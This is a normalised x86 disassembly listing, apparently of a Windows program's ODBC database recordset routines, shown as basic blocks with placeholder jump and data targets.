lea eax [ ebp - 0x14 ]
push r--data
push eax
mov [ ebp - 0x14 ] edi
call sub_42dca7
mov ecx edi
call sub_442f87
mov eax [ edi ]
or [ ebp - 0x4 ] 0xffffffff
push 0x0
mov ecx edi
push [ esi + 0x4 ]
push [ esi + 0x8 ]
call [ eax + 0x14 ]
push r--data
lea ecx [ edi + 0x10 ]
call sub_43b246
test eax eax
jl r-xdata
sub_421bd9
push edi
mov edi ecx
cmp [ edi + 0x14 ] 0x0
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x94 ]
test eax eax
jne r-xdata
pop edi
retn 0x4
cmp [ edi + 0x1c ] 0x0
je r-xdata
push ebx
xor ebx ebx
cmp [ esp + 0xc ] ebx
push esi
jne r-xdata
cmp eax 0x1
mov ecx edi
jne r-xdata
push [ esp + 0x10 ]
mov ecx edi
call sub_423b7f
mov esi eax
dec esi
mov ebx esi
mov esi [ edi + 0x14 ]
dec esi
jmp r-xdata
call sub_423f71
call sub_423f4d
jmp r-xdata
pop esi
pop ebx
test eax eax
jne r-xdata
xor eax eax
mov eax ebx
mov ecx edi
push eax
inc ebx
call sub_423c6e
jmp r-xdata
cmp ebx esi
jg r-xdata
sub_421c47
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
xor ebx ebx
cmp [ esi + 0xe8 ] ebx
lea edi [ esi + 0xe8 ]
jne r-xdata
jle r-xdata
call sub_422fb5
mov ecx esi
call sub_422fe7
cmp [ edi ] ebx
push [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ecx esi
push ebx
call sub_42300f
cmp bx 0x2
je r-xdata
push [ esi + 0x14 ]
push ebx
push [ esi + 0xec ]
call sub_42dc30
add esp 0xc
mov [ esi + 0x94 ] ebx
test [ esi + 0x2c ] 0x10
je r-xdata
cmp bx 0x3
je r-xdata
lea edi [ esi + 0xb8 ]
mov ecx esi
push edi
push [ ebp + 0x8 ]
push ebx
call sub_4230a0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
lea edi [ esi + 0xb8 ]
push eax
push edi
push [ ebp + 0x8 ]
mov ecx esi
push ebx
call sub_42311d
jmp r-xdata
cmp bx 0x1
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ esi + 0xc8 ] eax
jne r-xdata
push [ edi ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0x8 ]
push ebx
push [ ebp - 0x4 ]
call [ eax + 0x4c ]
xor eax eax
cmp [ esi + 0x14 ] eax
jbe r-xdata
cmp bx 0x4
je r-xdata
cmp [ esi + 0xc4 ] eax
jne r-xdata
cmp bx 0x6
jne r-xdata
test [ esi + 0x2d ] 0x2
jne r-xdata
mov ecx esi
call sub_423e20
sub_421d22
mov eax sub_463468
call sub_42dc88
sub esp 0x14
cmp [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
jne r-xdata
mov eax [ esi ]
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x20 ]
call sub_420a4d
xor edi edi
lea ecx [ ebp - 0x20 ]
push edi
mov [ ebp - 0x4 ] edi
push [ esi + 0x4 ]
push [ esi + 0x8 ]
call sub_420ad5
push r--data
lea ecx [ ebp - 0x10 ]
call sub_43b246
test eax eax
jl r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov eax [ esi ]
push 0x0
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x54 ]
push r--data
lea ecx [ ebp - 0x10 ]
call sub_43b246
test eax eax
jl r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x4c ] 0x1
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_420a96
pop edi
jmp r-xdata
mov eax [ esi ]
push edi
push 0x3fe
mov eax [ esi ]
push edi
push 0x3fd
jmp r-xdata
cmp [ esi + 0x24 ] edi
jne r-xdata
mov ecx esi
call [ eax + 0x54 ]
sub_421dd7
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
call sub_421b1a
test eax eax
jne r-xdata
test [ esi + 0x2d ] 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0xfc ] eax
jmp r-xdata
pop esi
leave
retn 0x4
mov eax [ esi + 0x100 ]
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx esi
call sub_422b34
lea eax [ edi + edi ]
push eax
call sub_441e89
test [ esi + 0x2d ] 0x4
pop ecx
mov [ esi + 0xb4 ] eax
jne r-xdata
cmp eax edi
jb r-xdata
push [ esi + 0xfc ]
push 0x9
push [ esi + 0x4 ]
call Ordinal_ODBC32_51
pop edi
push ebx
push 0x0
push esi
push 0xf
lea ecx [ ebp - 0x38 ]
mov [ esi + 0xfc ] edi
call sub_424393
mov eax [ esi ]
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call [ eax + 0x44 ]
mov ebx [ esi + 0xe8 ]
and [ esi + 0xe8 ] 0x0
mov [ esi + 0x100 ] edi
lea edi [ esi + 0xe8 ]
mov ecx esi
call sub_422fb5
mov [ edi ] ebx
pop ebx
mov [ esi + 0xfc ] edi
jmp r-xdata
sub_421e90
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0xd0 ] edi
jne r-xdata
test [ esi + 0x2d ] 0x2
jne r-xdata
mov eax [ esi ]
push edi
push 0x3f1
call [ eax + 0x54 ]
pop edi
pop esi
retn
cmp [ esi + 0x1c ] edi
je r-xdata
push 0x1
push edi
mov ecx esi
call sub_422118
push edi
push edi
mov ecx esi
call sub_4220d2
mov [ esi + 0x94 ] 0x2
cmp [ esi + 0x14 ] edi
jbe r-xdata
cmp [ esi + 0x94 ] edi
mov ecx esi
je r-xdata
call sub_423f00
call sub_423f24
mov ecx esi
sub_421eef
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0xcc ] ebx
jne r-xdata
test [ esi + 0x2d ] 0x2
jne r-xdata
mov eax [ esi ]
push ebx
push 0x3f1
call [ eax + 0x54 ]
pop esi
pop ebx
retn
cmp [ esi + 0xc8 ] ebx
jne r-xdata
mov eax [ esi ]
push ebx
push 0x3ef
mov ecx esi
call [ eax + 0x54 ]
cmp [ esi + 0xc4 ] ebx
jne r-xdata
cmp [ esi + 0xa8 ] 0x1
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ esi + 0xe4 ] ebx
je r-xdata
cmp [ esi + 0x1c ] ebx
pop edi
je r-xdata
push 0x2
push ebx
push 0x1
push [ esi + 0x4 ]
call Ordinal_ODBC32_68
mov edi eax
cmp di 0x2
je r-xdata
mov eax [ esi + 0x88 ]
push edi
cmp eax ebx
je r-xdata
mov [ esi + 0x94 ] 0x1
cmp [ esi + 0x14 ] ebx
jbe r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
cmp [ esi + 0x94 ] ebx
mov ecx esi
je r-xdata
mov eax [ esi ]
push ebx
push edi
mov ecx esi
call [ eax + 0x54 ]
call sub_423f00
call sub_423f24
mov ecx esi
sub_421fa8
push esi
mov esi ecx
test [ esi + 0x2d ] 0x2
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax 0x2
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_42404b
pop esi
retn
cmp eax 0x1
je r-xdata
mov eax [ esi ]
push 0x0
push 0x3ed
mov ecx esi
call [ eax + 0x54 ]
sub_421fdc
push esi
mov esi ecx
test [ esi + 0x2d ] 0x2
jne r-xdata
pop esi
retn
cmp [ esi + 0x94 ] 0x0
je r-xdata
mov ecx esi
call sub_42404b
mov eax [ esi ]
push 0x0
push 0x3ed
call [ eax + 0x54 ]
sub_422026
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov ax [ esi + 0x30 ]
test ax ax
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x1
jl r-xdata
mov eax [ esi ]
push 0x0
push 0x402
mov ecx esi
call [ eax + 0x54 ]
cmp [ ebp + 0x8 ] ax
jle r-xdata
mov ecx [ esi + 0x38 ]
mov cx [ ecx + edi - 0xc ]
push ecx
lea ecx [ ebp - 0x4 ]
push [ ebp + 0xc ]
push ebx
push ecx
push eax
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
push [ esi + 0x8 ]
call sub_4242ad
mov ecx [ ebp + 0xc ]
call sub_4420d3
jmp r-xdata
movsx edi [ ebp + 0x8 ]
mov eax [ esi + 0x38 ]
shl edi 0x4
add eax edi
push [ eax - 0x8 ]
mov ax [ eax - 0xc ]
push eax
call sub_424231
mov ecx [ ebp + 0xc ]
mov ebx eax
push ebx
call sub_4425ef
mov ecx [ esi + 0x38 ]
mov [ ebp - 0x4 ] eax
mov cx [ ecx + edi - 0xc ]
push ecx
push ebx
push eax
push 0x1
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
push [ esi + 0x8 ]
call sub_42425d
cmp eax 0xffffffff
jne r-xdata
sub_4220d2
push ebx
push esi
push edi
xor edi edi
cmp [ esp + 0x10 ] edi
mov ebx ecx
je r-xdata
mov esi [ ebx + 0x14 ]
dec esi
js r-xdata
push [ esp + 0x10 ]
call sub_423b7f
mov edi eax
dec edi
js r-xdata
pop edi
pop esi
pop ebx
retn 0x8
cmp [ esp + 0x14 ] 0x0
push edi
mov ecx ebx
je r-xdata
mov esi edi
jmp r-xdata
call sub_423c93
call sub_423c81
jmp r-xdata
inc edi
cmp edi esi
jle r-xdata
sub_422118
push ebp
mov ebp esp
sub esp 0x38
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
cmp [ esi + 0x14 ] 0x0
jbe r-xdata
push [ ebp + 0x8 ]
call sub_423ba1
dec eax
js r-xdata
pop esi
leave
retn 0x8
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
push esi
push 0xb
call sub_424393
mov eax [ ebp + 0xc ]
and [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x24 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
cmp [ ebp + 0xc ] 0x0
push eax
mov ecx esi
je r-xdata
call sub_423d01
jmp r-xdata
call sub_423cef
jmp r-xdata
sub_422177
mov eax sub_463474
call sub_42dc88
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
test [ esi + 0x2d ] 0x20
je r-xdata
mov eax [ esi + 0x108 ]
mov ecx [ esi + 0xc ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x108 ]
lea ebx [ esi + 0xc ]
push eax
push ecx
call sub_42d51e
pop ecx
test eax eax
pop ecx
jne r-xdata
xor eax eax
push ebx
mov ecx edi
call sub_442281
lea eax [ esi + 0x10 ]
lea ecx [ esi + 0x10c ]
push eax
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov eax [ esi + 0x104 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ esi + 0x10c ]
mov ecx [ esi + 0x10 ]
push eax
push ecx
call sub_42d51e
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ esi + 0x2c ]
mov edx [ esi ]
mov ecx esi
push eax
push [ esi + 0x88 ]
call [ edx + 0xc ]
jmp r-xdata
push [ esi + 0x2c ]
mov eax [ esi ]
mov ecx esi
push 0x0
push [ esi + 0x88 ]
call [ eax + 0xc ]
jmp r-xdata
xor ebx ebx
push ebx
push [ esi + 0x4 ]
call Ordinal_ODBC32_16
push [ esi + 0x4 ]
mov ecx esi
mov [ esi + 0x90 ] ebx
call sub_423d42
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ esi + 0x4 ]
call Ordinal_ODBC32_12
mov edi eax
cmp di 0x2
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
cmp eax ebx
jne r-xdata
push 0x1
mov ecx esi
pop edi
mov [ esi + 0x90 ] edi
call sub_422fe7
mov eax [ esi ]
push edi
push edi
mov ecx esi
call [ eax + 0x14 ]
mov eax [ esi + 0xc8 ]
mov [ esi + 0xc4 ] eax
mov eax edi
jmp r-xdata
mov eax [ esi ]
push ebx
push edi
mov ecx esi
call [ eax + 0x54 ]
sub_42230c
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x8 ]
push [ esp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x18 ]
cmp [ esi + 0x88 ] 0x2
lea edi [ esi + 0x88 ]
jne r-xdata
mov ecx esi
call sub_422b8c
cmp [ edi ] 0x2
je r-xdata
test [ esi + 0x2d ] 0x8
je r-xdata
pop edi
pop esi
retn 0x4
mov ecx esi
call sub_4228ae
mov ecx esi
call sub_422944
mov ecx esi
mov edi eax
call sub_422bc6
push edi
mov ecx esi
push [ esp + 0x10 ]
call sub_422be8
sub_422365
movsx eax [ esp + 0x4 ]
test eax eax
jl r-xdata
xor eax eax
cmp eax 0x1
jle r-xdata
push 0x1
pop eax
jmp r-xdata
cmp eax 0x62
jle r-xdata
retn 0x4
cmp eax 0x64
jg r-xdata
sub_422387
mov eax [ esp + 0x4 ]
push esi
cmp eax 0xffffffff
push edi
mov esi ecx
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ esi + 0x88 ] eax
mov edx ecx
and edx 0x8
jne r-xdata
mov eax [ esi + 0x8c ]
push 0x1
pop eax
test cl 0x4
je r-xdata
xor eax eax
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
and [ esi + 0x1c ] 0x0
test eax ecx
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edi ecx
mov [ esi + 0xd0 ] eax
and edi 0x4
jne r-xdata
push [ esp + 0x10 ]
mov [ esi + 0x2c ] ecx
lea ecx [ esi + 0x104 ]
call sub_4422d1
lea eax [ esi + 0xc ]
lea ecx [ esi + 0x108 ]
push eax
call sub_442281
lea eax [ esi + 0x10 ]
lea ecx [ esi + 0x10c ]
push eax
call sub_442281
pop edi
pop esi
retn 0xc
test edi edi
jne r-xdata
cmp [ esi + 0x88 ] 0x2
jne r-xdata
mov [ esi + 0xcc ] eax
mov eax 0x200
test cl 0x20
jne r-xdata
or ecx 0x4
test eax ecx
je r-xdata
or ch 0x8
sub_422433
mov eax sub_463499
call sub_42dc88
sub esp 0x20
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov [ ebp - 0x24 ] esi
cmp [ esi + 0x4 ] ebx
mov [ ebp - 0x10 ] esp
jne r-xdata
push 0x1
pop eax
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
cmp [ esi + 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx esi
call [ eax + 0x34 ]
push eax
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x3
call sub_442281
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
push 0x60
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x20 ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
lea eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
call Ordinal_ODBC32_3
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x48 ]
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x34 ]
push 0x1
mov [ ebp - 0x14 ] eax
pop eax
cmp [ esi + 0x88 ] eax
jne r-xdata
xor eax eax
call sub_420d1c
jmp r-xdata
push 0xf
call sub_45565c
mov ecx [ esi + 0x8 ]
push esi
add ecx 0x1c
mov [ ebp - 0x4 ] 0x4
call sub_43cec6
push 0xf
mov [ ebp - 0x4 ] 0x1
call sub_4556cc
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_442148
mov eax [ esi ]
push ebx
push 0xfffffffe
mov ecx esi
call [ eax + 0x54 ]
push [ ebp - 0x14 ]
mov eax [ ecx ]
mov edi rw-data
push [ ebp - 0x18 ]
push ebx
push ebx
push edi
call [ eax + 0xc ]
cmp eax ebx
je r-xdata
test [ esi + 0x2c ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x8 ] eax
mov [ esi + 0xc0 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_442148
xor eax eax
jmp r-xdata
cmp [ esi + 0x88 ] 0x1
jne r-xdata
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ ebp - 0x14 ] ebx
jne r-xdata
lea eax [ ebp - 0x12 ]
push eax
lea eax [ ebp - 0x20 ]
push 0x4
push eax
mov eax [ esi + 0x8 ]
push 0x2c
push [ eax + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
mov [ ebp - 0x1c ] eax
call [ edx + 0x48 ]
cmp eax ebx
jne r-xdata
test [ ebp - 0x20 ] 0x10
jne r-xdata
mov eax [ esi ]
push ebx
push [ ebp - 0x1c ]
mov ecx esi
call [ eax + 0x54 ]
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
mov ecx [ esi + 0x8 ]
push 0x1
push [ ebp - 0x18 ]
mov eax [ ecx ]
push ebx
push ebx
push edi
call [ eax + 0xc ]
cmp eax ebx
jne r-xdata
sub_4225d3
push 0xf
call sub_4556cc
xor ebx ebx
push ebx
push ebx
call sub_42dca7
mov esi [ ebp - 0x24 ]
xor ebx ebx
cmp [ esi + 0xc0 ] ebx
je r-xdata
push ebx
push ebx
call sub_42dca7
mov ecx [ esi + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ esi + 0x8 ] ebx
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_422608
mov eax sub_4634ac
call sub_42dc88
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
push esi
push edi
mov esi ecx
jne r-xdata
push [ ebp + 0x8 ]
lea edi [ esi + 0xd4 ]
mov ecx edi
call sub_4422d1
mov eax [ esi ]
lea ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
call [ eax + 0x38 ]
lea edi [ esi + 0xd4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] ebx
call sub_442281
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_442148
jmp r-xdata
mov ecx esi
call sub_4233ee
mov ecx esi
call sub_42350b
cmp [ esi + 0xcc ] ebx
jne r-xdata
push [ esi + 0x4 ]
mov ecx esi
call sub_423d13
cmp [ esi + 0x18 ] ebx
je r-xdata
mov ecx esi
call sub_423560
test eax eax
jne r-xdata
cmp [ esi + 0xd0 ] ebx
je r-xdata
cmp [ esi + 0xcc ] ebx
je r-xdata
mov [ esi + 0xd0 ] ebx
mov [ esi + 0xcc ] ebx
push ebx
mov ecx edi
call sub_442578
mov ecx [ esi + 0x8 ]
push eax
call sub_4210b7
push 0xffffffff
mov ecx edi
call sub_4425c7
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ esi + 0x28 ] ebx
je r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x10 ] ebx
je r-xdata
push r--data
mov ecx edi
call sub_442524
sub_4226e8
mov eax sub_4634c1
call sub_42dc88
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
push 0x2
mov eax [ esi + 0xd4 ]
pop ebx
mov [ ebp - 0x10 ] eax
push 0xfffffffd
push [ ebp - 0x10 ]
push [ esi + 0x4 ]
call Ordinal_ODBC32_19
mov edi eax
cmp di bx
je r-xdata
push 0xfffffffd
push [ ebp - 0x10 ]
push [ esi + 0x4 ]
call Ordinal_ODBC32_11
mov edi eax
cmp di bx
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
jmp r-xdata
test [ esi + 0x2d ] 0x20
jne r-xdata
push 0x14
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor ebx ebx
push [ esi + 0x4 ]
call Ordinal_ODBC32_12
mov edi eax
cmp di bx
je r-xdata
xor edi edi
push edi
call sub_420a4d
mov edi eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
lea eax [ ebp - 0x14 ]
push eax
push 0x7
push [ esi + 0x4 ]
call Ordinal_ODBC32_46
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x10 ] edi
call sub_42dca7
push r--data
lea ecx [ edi + 0x10 ]
call sub_43b246
test eax eax
jl r-xdata
mov eax [ edi ]
or [ ebp - 0x4 ] 0xffffffff
push 0x1
mov ecx edi
push [ esi + 0x4 ]
push [ esi + 0x8 ]
call [ eax + 0x14 ]
cmp [ esi + 0xb0 ] 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
mov eax [ esi ]
push ebx
push edi
mov ecx esi
call [ eax + 0x54 ]
mov eax [ esi ]
xor ebx ebx
push ebx
push edi
mov ecx esi
call [ eax + 0x54 ]
jmp r-xdata
mov ecx edi
call sub_442f87
test [ esi + 0xac ] bl
je r-xdata
cmp [ esi + 0xcc ] ebx
lea eax [ esi + 0xcc ]
jne r-xdata
push 0x1
pop eax
cmp di ax
mov [ esi + 0x90 ] eax
jne r-xdata
and [ esi + 0xd0 ] 0x0
and [ esi + 0xcc ] 0x0
mov [ esi + 0xb0 ] 0x1
mov eax [ esi + 0xb0 ]
cmp eax 0x3
je r-xdata
mov [ eax ] ebx
mov [ esi + 0xd0 ] ebx
cmp [ esi + 0xd0 ] ebx
je r-xdata
test [ esi + 0x2d ] 0x20
je r-xdata
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x54 ]
jmp r-xdata
mov [ esi + 0xb0 ] ebx
jmp r-xdata
cmp eax 0x4
jne r-xdata
push [ esi + 0xb0 ]
push 0x7
push [ esi + 0x4 ]
call Ordinal_ODBC32_51
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
sub_4228ae
push ebp
mov ebp esp
sub esp 0x24
push esi
mov esi ecx
lea eax [ ebp - 0x2 ]
push edi
push eax
mov eax [ esi + 0x8 ]
push 0x3b
push [ eax + 0x4 ]
call Ordinal_ODBC32_44
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
movzx eax [ ebp - 0x2 ]
test eax eax
mov [ esi + 0xe0 ] eax
jne r-xdata
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x54 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24 ]
push 0x1e
push eax
mov eax [ esi + 0x8 ]
push 0xa
push [ eax + 0x4 ]
call Ordinal_ODBC32_45
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
and [ esi + 0xcc ] eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x30
jne r-xdata
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x54 ]
pop edi
pop esi
leave
retn
cmp [ ebp - 0x23 ] 0x32
jge r-xdata
mov eax [ esi ]
push 0x0
push 0x3fa
mov ecx esi
call [ eax + 0x54 ]
sub_422944
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x2 ]
push edi
push eax
mov esi ecx
lea eax [ ebp - 0x8 ]
push 0x4
push eax
mov eax [ esi + 0x8 ]
push 0x2c
push [ eax + 0x4 ]
call Ordinal_ODBC32_45
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
test eax eax
jne r-xdata
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x54 ]
cmp eax 0x1
jne r-xdata
test [ ebp - 0x8 ] 0x2
jne r-xdata
test [ ebp - 0x8 ] 0x4
jne r-xdata
test [ ebp - 0x8 ] 0x10
jne r-xdata
push 0x1
jmp r-xdata
mov eax [ esi ]
push 0x0
push 0x3f4
mov ecx esi
call [ eax + 0x54 ]
push 0x2
mov eax [ esi ]
push 0x0
push 0x401
mov ecx esi
call [ eax + 0x54 ]
push 0x3
jmp r-xdata
mov eax [ esi ]
push 0x0
push 0x3f5
mov ecx esi
call [ eax + 0x54 ]
pop eax
pop edi
pop esi
leave
retn
sub_4229d6
mov eax sub_4634d6
call sub_42dc88
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
lea ebx [ esi + 0x30 ]
push ebx
push [ esi + 0x4 ]
call Ordinal_ODBC32_18
mov edi eax
cmp di 0x2
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
mov ax [ ebx ]
test ax ax
je r-xdata
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x54 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
movsx edi ax
mov eax edi
shl eax 0x4
add eax 0x4
push eax
call sub_441e89
pop ecx
mov [ ebp - 0x18 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push j_sub_442148
push sub_42699c
lea ebx [ eax + 0x4 ]
push edi
push 0x10
push ebx
mov [ eax ] edi
call sub_42e240
mov eax ebx
jmp r-xdata
mov eax [ esi + 0x38 ]
push 0x101
shl edi 0x4
lea ecx [ eax + edi - 0x10 ]
call sub_442578
mov [ ebp - 0x18 ] eax
or [ ebp - 0x4 ] 0xffffffff
push 0x1
pop edi
mov [ esi + 0x38 ] eax
cmp [ esi + 0x30 ] di
mov [ ebp - 0x14 ] edi
jl r-xdata
mov eax [ esi + 0x38 ]
add eax edi
lea ecx [ eax - 0x2 ]
push ecx
lea ecx [ eax - 0x4 ]
push ecx
lea ecx [ eax - 0x8 ]
add eax 0xfffffff4
push ecx
push eax
lea eax [ ebp - 0xe ]
push eax
push 0x100
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ esi + 0x4 ]
call Ordinal_ODBC32_8
mov ebx eax
cmp bx 0x2
je r-xdata
movsx eax [ ebp - 0xe ]
push eax
mov eax [ esi + 0x38 ]
lea ecx [ eax + edi - 0x10 ]
call sub_4425c7
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
inc [ ebp - 0x14 ]
movzx edi [ ebp - 0x14 ]
movsx eax [ esi + 0x30 ]
cmp edi eax
jle r-xdata
mov eax [ esi ]
push 0x0
push ebx
mov ecx esi
call [ eax + 0x54 ]
sub_422b04
push esi
mov esi ecx
test [ esi + 0x2d ] 0x2
je r-xdata
push 0x2
call sub_441e89
pop ecx
mov [ esi + 0xb4 ] eax
mov [ esi + 0xfc ] 0x1
pop esi
retn
mov eax [ esi ]
push [ esi + 0xfc ]
call [ eax + 0x18 ]
pop esi
retn
sub_422b34
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push edi
push [ esi + 0xb4 ]
lea edi [ esi + 0xb4 ]
call sub_441eb2
mov eax [ esi + 0x2c ]
and [ edi ] 0x0
test ah 0x2
pop ecx
je r-xdata
and [ esi + 0x100 ] 0x0
pop edi
pop esi
leave
retn
test ah 0x4
jne r-xdata
cmp [ esi + 0x100 ] 0x0
je r-xdata
push 0x0
push esi
push 0x10
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi ]
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call [ eax + 0x44 ]
sub_422b8c
push esi
mov esi ecx
push edi
test [ esi + 0x2d ] 0x1
je r-xdata
pop edi
pop esi
retn
mov eax [ esi + 0x8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
push 0x1
push 0xc
push [ esi + 0x4 ]
call Ordinal_ODBC32_51
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x54 ]
sub_422bc6
mov eax [ ecx + 0x8 ]
push 0x1
pop edx
mov eax [ eax + 0x4c ]
test dl al
je r-xdata
test al 0x2
je r-xdata
and [ ecx + 0x28 ] 0x0
retn
and [ ecx + 0xcc ] 0x0
retn
mov [ ecx + 0x28 ] edx
retn
sub_422be8
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
xor ecx ecx
push edi
cmp [ esi + 0xcc ] ecx
mov [ esi + 0xb0 ] 0x1
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x3c ] ecx
je r-xdata
cmp [ esi + 0xd0 ] ecx
je r-xdata
push [ ebp + 0xc ]
push 0x6
push [ ebp + 0x8 ]
